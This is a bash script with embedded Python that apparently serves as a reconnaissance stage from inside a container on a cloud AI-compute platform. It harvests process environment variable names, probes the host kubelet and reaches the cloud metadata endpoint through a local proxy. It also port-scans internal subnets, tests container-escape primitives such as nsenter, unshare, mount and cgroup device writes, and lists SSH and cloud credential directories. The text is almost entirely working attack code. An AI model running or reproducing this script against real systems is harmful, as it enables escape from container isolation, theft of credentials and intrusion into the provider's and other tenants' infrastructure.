#!/bin/bash
set +e
echo "###P2START $(date -u)"
echo "=== ROOT-LS ==="; ls -la / /root 2>&1 | head -60
echo "=== ONETHING ==="; find /.onething -maxdepth 4 2>/dev/null | head -60
echo "=== INIT-SH ==="; sed -n '1,120p' /.onething/instance/tools/script/init.sh 2>&1
echo "=== ONETHING-ENV-KEYS ==="; tr '\0' '\n' </proc/1/environ 2>/dev/null | cut -d= -f1 | sort | head -40
echo "=== ONETHING-FILES ==="; for f in /.onething/instance/* /.onething/instance/tools/script/*; do [ -f "$f" ] && { echo "--- $f"; head -c 400 "$f"; echo; }; done 2>/dev/null | head -120
echo "=== OTPUBLIC ==="; ls -la /.ot_u_public 2>&1; ls -la /.ot_u_public/onething-ai 2>&1 | head
echo "=== JFS ==="; ls -la /root/onethingai-fs 2>&1 | head; ls /root/onethingai-fs/data1 2>&1 | head
echo "=== MNT ==="; ls -la /mnt /mnt/data /xymnt 2>&1 | head -30
echo "=== RUN ==="; ls -la /run /var/run 2>&1 | head -50
echo "=== MOUNTINFO-EXT4 ==="; grep -E 'nvme|ext4|xfs|juicefs' /proc/self/mountinfo | head -30
echo "=== LSBLK ==="; lsblk 2>&1 | head -20; ls -l /dev/nvme* /dev/sd* 2>&1 | head
echo "=== KUBELET-CERT ==="; timeout 8 openssl s_client -connect 172.17.0.1:10250 </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>&1 | head -15
echo "=== PROXY-1080 ==="
python3 - <<'PY'
import socket,binascii
def socks5(host,port,target,tp):
    try:
        s=socket.create_connection((host,port),timeout=5); s.settimeout(8)
        s.sendall(b"\x05\x01\x00"); r=s.recv(2); print("socks greet:",r.hex())
        if r!=b"\x05\x00": return
        tb=target.encode(); req=b"\x05\x01\x00\x03"+bytes([len(tb)])+tb+tp.to_bytes(2,'big')
        s.sendall(req); rr=s.recv(10); print("socks reply:",rr.hex())
        return s
    except Exception as e: print("socks err",type(e).__name__)
print("--- socks5 to 172.17.0.1:1080 -> 127.0.0.1:10250")
s=socks5("172.17.0.1",1080,"127.0.0.1",10250)
if s:
    s.sendall(b"GET /healthz HTTP/1.1\r\nHost: 127.0.0.1:10250\r\nConnection: close\r\n\r\n")
    try: print("resp:",s.recv(300))
    except Exception as e: print("resp err",type(e).__name__)
    s.close()
print("--- socks5 -> 100.100.100.200:80")
s=socks5("172.17.0.1",1080,"100.100.100.200",80)
if s:
    s.sendall(b"GET /latest/meta-data/instance-id HTTP/1.1\r\nHost: 100.100.100.200\r\nConnection: close\r\n\r\n")
    try: print("resp:",s.recv(400))
    except Exception as e: print("resp err",type(e).__name__)
    s.close()
PY
echo "=== HTTP-PROXY-1080 ==="; curl -s -m 8 -x http://172.17.0.1:1080 -o /tmp/o1 -w "http_proxy_code=%{http_code}\n" http://100.100.100.200/latest/meta-data/instance-id; head -c 200 /tmp/o1 2>/dev/null; echo
curl -sk -m 8 -x http://172.17.0.1:1080 -o /tmp/o2 -w "proxy_kubelet=%{http_code}\n" https://127.0.0.1:10250/healthz; head -c 200 /tmp/o2 2>/dev/null; echo
echo "=== SEGMENTS ==="
python3 - <<'PY'
import socket,concurrent.futures
nets=[("192.168.2.%d"%i) for i in (1,2,3,4,10,20,33,50,100,101,102,110,120,200,254)]
nets+= [("192.168.1.%d"%i) for i in (1,2,10,100,254)]
nets+= [("10.0.0.%d"%i) for i in (1,2,10)] + [("172.16.0.%d"%i) for i in (1,)]
ports=[443,623,22,3389,5900,80]
def chk(t):
    h,p=t
    try:
        s=socket.create_connection((h,p),timeout=2); s.close(); return (h,p,"OPEN")
    except Exception as e:
        return None
tg=[(h,p) for h in nets for p in ports]
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
    for r in ex.map(chk,tg):
        if r: print(r[0]+":"+str(r[1]),r[2])
PY
echo "=== CAP-TESTS ==="
mkdir -p /tmp/mt 2>/dev/null; mount -t tmpfs none /tmp/mt 2>&1 | head -2; echo "mount_rc=$?"
unshare -m /bin/true 2>&1 | head -2; echo "unshare_rc=$?"
nsenter -t 1 -m /bin/true 2>&1 | head -2; echo "nsenter_rc=$?"
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null; cat /proc/sys/user/max_user_namespaces 2>/dev/null
echo "=== CGROUP-V1 ==="; ls /sys/fs/cgroup | head; cat /sys/fs/cgroup/devices/cgroup.clone_children 2>/dev/null; ls -ld /sys/fs/cgroup/devices 2>/dev/null; touch /sys/fs/cgroup/devices/x 2>&1 | head -2
echo "=== DOCKER-CLI ==="; command -v docker ctr crictl nerdctl kubectl; env | grep -iE 'docker|kube|k8s|agent|onething|xy' | cut -d= -f1
echo "=== SSH-KEYS ==="; ls -la /root/.ssh 2>&1; ls -la /root/.aliyun /root/.ossutilconfig /root/.aws /root/.kube 2>&1
echo "=== AGENT ==="; ps -eo pid,ppid,user,args --sort=pid 2>/dev/null | head -40
echo "###P2END $(date -u)"
